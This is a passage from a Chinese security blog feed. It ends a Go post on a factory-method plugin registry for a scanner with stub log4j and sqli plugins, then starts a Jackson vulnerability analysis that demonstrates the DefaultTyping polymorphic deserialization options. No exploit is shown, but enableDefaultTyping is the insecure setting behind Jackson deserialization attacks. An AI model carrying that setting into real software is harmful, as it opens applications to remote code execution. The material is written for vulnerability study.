<p>工厂方法模式（英语：Factory method pattern）是一种实现了“工厂”概念的面向对象设计模式。就像其他创建型模式一样，它也是处理在不指定对象具体类型的情况下创建对象的问题。工厂方法模式的实质是“定义一个创建对象的接口，但让实现这个接口的类来决定实例化哪个类。工厂方法让类的实例化推迟到子类中进行。</p>
<p>先定义一个叫Plugins的map，用来存储类。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> Plugins <span class="keyword">map</span>[<span class="keyword">string</span>]Plugin</span><br></pre></td></tr></table></figure>



<p>Info用来保存插件信息</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Plugin Info</span></span><br><span class="line"><span class="keyword">type</span> Info <span class="keyword">struct</span> &#123;</span><br><span class="line">	Name <span class="keyword">string</span></span><br><span class="line">	Desc <span class="keyword">string</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>定义一个叫接Plugins口的</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Plugin 插件接口</span></span><br><span class="line"><span class="keyword">type</span> Plugin <span class="keyword">interface</span> &#123;</span><br><span class="line">	New() Info</span><br><span class="line">	Scan(sender Sender)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>定义一个叫Regist用来注册插件的方法</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Regist 注册插件</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Regist</span><span class="params">(target <span class="keyword">string</span>, plugin Plugin)</span></span> &#123;</span><br><span class="line">	Plugins[target] = plugin</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>







<p>根据Plugin接口实现两个插件</p>
<ul>
<li>log4j</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> passive</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;ShadowScan/plugin&quot;</span></span><br><span class="line">	<span class="string">&quot;log&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> log4j <span class="keyword">struct</span> &#123;</span><br><span class="line">	info plugin.Info</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">init</span><span class="params">()</span></span> &#123;</span><br><span class="line">	plugin.Regist(<span class="string">&quot;log4j&quot;</span>, &amp;log4j&#123;&#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p *log4j)</span> <span class="title">New</span><span class="params">()</span> <span class="title">plugin</span>.<span class="title">Info</span></span> &#123;</span><br><span class="line">	p.info = plugin.Info&#123;</span><br><span class="line">		Name: <span class="string">&quot;log4j&quot;</span>,</span><br><span class="line">		Desc: <span class="string">&quot;log4j scan&quot;</span>,</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> p.info</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p *log4j)</span> <span class="title">Scan</span><span class="params">(sender plugin.Sender)</span></span> &#123;</span><br><span class="line">	log.Println(<span class="string">&quot;log4jscan...&quot;</span>)</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>sqli</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> passive</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;ShadowScan/plugin&quot;</span></span><br><span class="line">	<span class="string">&quot;log&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> sqli <span class="keyword">struct</span> &#123;</span><br><span class="line">	info plugin.Info</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">init</span><span class="params">()</span></span> &#123;</span><br><span class="line">	plugin.Regist(<span class="string">&quot;sqli&quot;</span>, &amp;sqli&#123;&#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p *sqli)</span> <span class="title">New</span><span class="params">()</span> <span class="title">plugin</span>.<span class="title">Info</span></span> &#123;</span><br><span class="line">	p.info = plugin.Info&#123;</span><br><span class="line">		Name: <span class="string">&quot;sqli&quot;</span>,</span><br><span class="line">		Desc: <span class="string">&quot;sqli scan&quot;</span>,</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> p.info</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p *sqli)</span> <span class="title">Scan</span><span class="params">(sender plugin.Sender)</span></span> &#123;</span><br><span class="line">	log.Println(<span class="string">&quot;sqli scan...&quot;</span>)</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>然后我们用匿名包的方式，在main函数执行前执行这两个init方法，我们只需要在main文件中引入匿名包即可</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">_ <span class="string">&quot;ShadowScan/plugin/passive&quot;</span></span><br></pre></td></tr></table></figure>

<p>由于我们在注册插件之前需要先初始化Plugins用来存储插件对象，所以我们在引入匿名包之前在main文件中提前引入Plugins所在包</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">o	<span class="string">&quot;ShadowScan/plugin&quot;</span></span><br><span class="line">	_ <span class="string">&quot;ShadowScan/plugin/passive&quot;</span></span><br></pre></td></tr></table></figure>



<p>Plugins初始化方法</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">init</span><span class="params">()</span></span> &#123;</span><br><span class="line">	Plugins = <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">string</span>]Plugin)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>最后调用插件</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">PluginScan</span><span class="params">(req *http.Request)</span></span> &#123;</span><br><span class="line">	<span class="comment">// Plugins = make(map[string]Plugin)</span></span><br><span class="line">	sender, _ := NewSender(req)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> _, plugin := <span class="keyword">range</span> Plugins &#123;</span><br><span class="line">		plugin.Scan(sender)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Code</category>
      </categories>
      <tags>
        <tag>Go</tag>
      </tags>
  </entry>
  <entry>
    <title>Jackson漏洞分析</title>
    <url>/Jackson%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<blockquote>
<p>且将新火试新茶，诗酒趁年华。</p>
</blockquote>
<p>Jackson漏洞学习</p>
<span id="more"></span>



<h2 id="1-前言"><a href="#1-前言" class="headerlink" title="1. 前言"></a>1. 前言</h2><p>Jackson是一个开源的Java序列化和反序列化工具，可以将Java对象序列化为XML或JSON格式的字符串，以及将XML或JSON格式的字符串反序列化为Java对象。</p>
<p>我们知道在序列化和反序列时候容易出现漏洞，比如fastjon跟jackson都是序列化组件，漏洞层出不穷，当然Jackson也一样，历史上产生过不少漏洞</p>
<h2 id="2-Jackson的序列化"><a href="#2-Jackson的序列化" class="headerlink" title="2. Jackson的序列化"></a>2. Jackson的序列化</h2><p>在jackson内部，提供了<code>ObjectMapper.writeValueAsString()</code>和<code>ObjectMapper.readValue()</code>两个方法来实现序列化和反序列化的功能。</p>
<ul>
<li><code>ObjectMapper.writeValueAsString()</code>———序列化</li>
<li><code>ObjectMapper.readValue()</code>————————反序列化</li>
</ul>
<p>添加Maven依赖</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;jackson-databind&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">2.7</span><span class="number">.9</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- https:<span class="comment">//mvnrepository.com/artifact/com.fasterxml.jackson.core/jackson-core --&gt;</span></span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;jackson-core&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">2.7</span><span class="number">.9</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- https:<span class="comment">//mvnrepository.com/artifact/com.fasterxml.jackson.core/jackson-annotations --&gt;</span></span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;jackson-annotations&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">2.7</span><span class="number">.9</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>

<p> Demo测试</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> jackson;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Student stu = <span class="keyword">new</span> Student();</span><br><span class="line">        stu.name=<span class="string">&quot;shadowtest&quot;</span>;</span><br><span class="line">        stu.age=<span class="number">20</span>;</span><br><span class="line">        ObjectMapper mapper = <span class="keyword">new</span> ObjectMapper();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//用jackson进行序列化</span></span><br><span class="line">        String json=mapper.writeValueAsString(stu);</span><br><span class="line">        System.out.println(json);<span class="comment">// &#123;&quot;age&quot;:20,&quot;name&quot;:&quot;shadowtest&quot;&#125;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//用jackson进行反序列化</span></span><br><span class="line">        Student stu1 = mapper.readValue(json,Student.class);</span><br><span class="line">        System.out.println(stu1); <span class="comment">//age=20, name=shadowtest</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span>  <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> String.format(<span class="string">&quot;age=%d, name=%s&quot;</span>, age, name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>此用例我们jackson的ObjectMapper创建了一个mapper对象，然后用mapper对象进行序列化与反序列化</p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">ObjectMapper mapper = <span class="keyword">new</span> <span class="constructor">ObjectMapper()</span>;</span><br><span class="line">序列化：</span><br><span class="line">mapper.write<span class="constructor">ValueAsString()</span></span><br><span class="line">反序列化：</span><br><span class="line">mapper.read<span class="constructor">Value()</span></span><br></pre></td></tr></table></figure>







<h2 id="3-Jackson多态类型的反序列化"><a href="#3-Jackson多态类型的反序列化" class="headerlink" title="3. Jackson多态类型的反序列化"></a>3. Jackson多态类型的反序列化</h2><p>如果对多态类进行反序列化，如何保证反序列化之后是我们想要的那个特定类呢。Jackson实现了JacksonPolymorphicDeserialization机制来解决这个问题。</p>
<p><strong>JacksonPolymorphicDeserialization</strong>具体的子类信息绑定在序列化的内容中以便于后续反序列化的时候直接得到目标子类对象，其实现有两种:</p>
<ul>
<li>DefaultTyping</li>
<li>@JsonTypeInfo注解</li>
</ul>
<h3 id="3-1-DefaultTyping"><a href="#3-1-DefaultTyping" class="headerlink" title="3.1 DefaultTyping"></a>3.1 DefaultTyping</h3><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">com<span class="selector-class">.fasterxml</span><span class="selector-class">.jackson</span><span class="selector-class">.databind</span><span class="selector-class">.ObjectMapper</span>.DefaultTyping</span><br></pre></td></tr></table></figure>

<p>Jackson提供一个enableDefaultTyping设置，其包含4个值：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">enum</span> <span class="title">DefaultTyping</span> </span>&#123;</span><br><span class="line">    JAVA_LANG_OBJECT,</span><br><span class="line">    OBJECT_AND_NON_CONCRETE,</span><br><span class="line">    NON_CONCRETE_AND_ARRAYS,</span><br><span class="line">    NON_FINAL;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">DefaultTyping</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="3-1-1-JAVA-LANG-OBJECT"><a href="#3-1-1-JAVA-LANG-OBJECT" class="headerlink" title="3.1.1  JAVA_LANG_OBJECT"></a>3.1.1  JAVA_LANG_OBJECT</h4><p>当类里的属性声明为一个Object时，会对该Object进行序列化和反序列化。</p>
<p>通过<code>mapper.enableDefaultTyping(ObjectMapper.DefaultTyping.JAVA_LANG_OBJECT);</code>设置<code>JAVA_LANG_OBJECT</code>属性</p>
<p>我们在示例中新增一个Object对象，</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> jackson;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Student stu = <span class="keyword">new</span> Student();</span><br><span class="line">        stu.name=<span class="string">&quot;shadowtest&quot;</span>;</span><br><span class="line">        stu.age=<span class="number">20</span>;</span><br><span class="line">        stu.object = <span class="keyword">new</span> Boy();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建ObjectMapper对象</span></span><br><span class="line">        ObjectMapper mapper = <span class="keyword">new</span> ObjectMapper();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//用jackson进行序列化</span></span><br><span class="line">        String json=mapper.writeValueAsString(stu);</span><br><span class="line">        System.out.println(json);<span class="comment">// &#123;&quot;age&quot;:20,&quot;name&quot;:&quot;shadowtest&quot;,&quot;object&quot;:&#123;&quot;length&quot;:100&#125;&#125;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//用jackson进行反序列化</span></span><br><span class="line">        Student stu1 = mapper.readValue(json, Student.class);</span><br><span class="line">        System.out.println(stu1); <span class="comment">//age=20, name=shadowtest, &#123;length=100&#125;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> Object object;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> String.format(<span class="string">&quot;age=%d, name=%s, %s&quot;</span>, age, name, object == <span class="keyword">null</span> ? <span class="string">&quot;null&quot;</span> : object);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Boy</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> length = <span class="number">100</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>由结果知，反序列化的时候只反序列化了Object的属性，没有将类给反序列化出来。</p>
<p>如果我们添加JAVA_LANG_OBJECT属性。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> jackson;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Student stu = <span class="keyword">new</span> Student();</span><br><span class="line">        stu.name=<span class="string">&quot;shadowtest&quot;</span>;</span><br><span class="line">        stu.age=<span class="number">20</span>;</span><br><span class="line">        stu.object = <span class="keyword">new</span> Boy();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建ObjectMapper对象</span></span><br><span class="line">        ObjectMapper mapper = <span class="keyword">new</span> ObjectMapper();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//设置JAVA_LANG_OBJECT属性</span></span><br><span class="line">        mapper.enableDefaultTyping(ObjectMapper.DefaultTyping.JAVA_LANG_OBJECT);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//用jackson进行序列化</span></span><br><span class="line">        String json=mapper.writeValueAsString(stu);</span><br><span class="line">        System.out.println(json);<span class="comment">// &#123;&quot;age&quot;:20,&quot;name&quot;:&quot;shadowtest&quot;,&quot;object&quot;:[&quot;jackson.Boy&quot;,&#123;&quot;length&quot;:100&#125;]&#125;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//用jackson进行反序列化</span></span><br><span class="line">        Student stu1 = mapper.readValue(json, Student.class);</span><br><span class="line">        System.out.println(stu1); <span class="comment">//age=20, name=shadowtest, jackson.Boy@4678c730</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> Object object;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> String.format(<span class="string">&quot;age=%d, name=%s, %s&quot;</span>, age, name, object == <span class="keyword">null</span> ? <span class="string">&quot;null&quot;</span> : object);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Boy</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> length = <span class="number">100</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>反序列化的结果:</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&quot;age&quot;</span>:20,<span class="string">&quot;name&quot;</span>:<span class="string">&quot;shadowtest&quot;</span>,<span class="string">&quot;object&quot;</span>:[<span class="string">&quot;jackson.Boy&quot;</span>,&#123;<span class="string">&quot;length&quot;</span>:100&#125;]&#125;</span><br><span class="line"><span class="attribute">age</span>=20, <span class="attribute">name</span>=shadowtest, jackson.Boy@4678c730</span><br></pre></td></tr></table></figure>

<p>对比不添加JAVA_LANG_OBJECT的结果</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&quot;age&quot;</span>:20,<span class="string">&quot;name&quot;</span>:<span class="string">&quot;shadowtest&quot;</span>,<span class="string">&quot;object&quot;</span>:&#123;<span class="string">&quot;length&quot;</span>:100&#125;&#125;</span><br><span class="line"><span class="attribute">age</span>=20, <span class="attribute">name</span>=shadowtest, &#123;<span class="attribute">length</span>=100&#125;</span><br></pre></td></tr></table></figure>

<p>可以知道，添加JAVA_LANG_OBJECT属性可以一个类里的Object对象也给反序列出来。</p>
<h4 id="3-2-2-OBJECT-AND-NON-CONCRETE"><a href="#3-2-2-OBJECT-AND-NON-CONCRETE" class="headerlink" title="3.2.2 OBJECT_AND_NON_CONCRETE"></a>3.2.2 OBJECT_AND_NON_CONCRETE</h4><p>当类里有 Interface 、 AbstractClass 时，对其进行序列化和反序列化。</p>
<p>设置OBJECT_AND_NON_CONCRETE属性</p>
<figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line">mapper.enableDefaultTyping(ObjectMapper.DefaultTyping.OBJECT_AND_NON_CONCRETE)<span class="comment">;</span></span><br></pre></td></tr></table></figure>

<p>为了测试，我们定义一个Sex接口，用MySex来继承。在Student中定义一个Sex属性，</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> jackson;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Student stu = <span class="keyword">new</span> Student();</span><br><span class="line">        stu.name=<span class="string">&quot;shadowtest&quot;</span>;</span><br><span class="line">        stu.age=<span class="number">20</span>;</span><br><span class="line">        stu.object = <span class="keyword">new</span> Boy();</span><br><span class="line">        stu.sex = <span class="keyword">new</span> MySex();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建ObjectMapper对象</span></span><br><span class="line">        ObjectMapper mapper = <span class="keyword">new</span> ObjectMapper();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//设置OBJECT_AND_NON_CONCRETE属性</span></span><br><span class="line">        <span class="comment">//mapper.enableDefaultTyping(ObjectMapper.DefaultTyping.OBJECT_AND_NON_CONCRETE);</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//用jackson进行序列化</span></span><br><span class="line">        String json=mapper.writeValueAsString(stu);</span><br><span class="line">        System.out.println(json);<span class="comment">//</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//用jackson进行反序列化</span></span><br><span class="line">        Student stu1 = mapper.readValue(json, Student.class);</span><br><span class="line">        System.out.println(stu1); <span class="comment">//</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> Object object;</span><br><span class="line">    <span class="keyword">public</span> Sex sex;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> String.format(<span class="string">&quot;age=%d, name=%s, %s&quot;</span>, age, name, object == <span class="keyword">null</span> ? <span class="string">&quot;null&quot;</span> : object);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Boy</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> length = <span class="number">100</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Sex</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setSex</span><span class="params">(<span class="keyword">int</span> sex)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getSex</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MySex</span> <span class="keyword">implements</span> <span class="title">Sex</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> sex;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getSex</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> sex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setSex</span><span class="params">(<span class="keyword">int</span> sex)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.sex = sex;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当不设置OBJECT_AND_NON_CONCRETE属性是运行报错</p>
<p>设置</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> jackson;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Student stu = <span class="keyword">new</span> Student();</span><br><span class="line">        stu.name=<span class="string">&quot;shadowtest&quot;</span>;</span><br><span class="line">        stu.age=<span class="number">20</span>;</span><br><span class="line">        stu.object = <span class="keyword">new</span> Boy();</span><br><span class="line">        stu.sex = <span class="keyword">new</span> MySex();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建ObjectMapper对象</span></span><br><span class="line">        ObjectMapper mapper = <span class="keyword">new</span> ObjectMapper();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//设置OBJECT_AND_NON_CONCRETE属性</span></span><br><span class="line">        mapper.enableDefaultTyping(ObjectMapper.DefaultTyping.OBJECT_AND_NON_CONCRETE);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//用jackson进行序列化</span></span><br><span class="line">        String json=mapper.writeValueAsString(stu);</span><br><span class="line">        System.out.println(json);<span class="comment">// &#123;&quot;age&quot;:20,&quot;name&quot;:&quot;shadowtest&quot;,&quot;object&quot;:[&quot;jackson.Boy&quot;,&#123;&quot;length&quot;:100&#125;],&quot;sex&quot;:[&quot;jackson.MySex&quot;,&#123;&quot;sex&quot;:0&#125;]&#125;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//用jackson进行反序列化</span></span><br><span class="line">        Student stu1 = mapper.readValue(json, Student.class);</span><br><span class="line">        System.out.println(stu1); <span class="comment">//age=20, name=shadowtest, jackson.Boy@29ee9faa</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> Object object;</span><br><span class="line">    <span class="keyword">public</span> Sex sex;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> String.format(<span class="string">&quot;age=%d, name=%s, %s&quot;</span>, age, name, object == <span class="keyword">null</span> ? <span class="string">&quot;null&quot;</span> : object);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Boy</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> length = <span class="number">100</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Sex</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setSex</span><span class="params">(<span class="keyword">int</span> sex)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getSex</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MySex</span> <span class="keyword">implements</span> <span class="title">Sex</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> sex;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getSex</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> sex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setSex</span><span class="params">(<span class="keyword">int</span> sex)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.sex = sex;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>看出运行结果跟不开起属性没有啥区别</p>
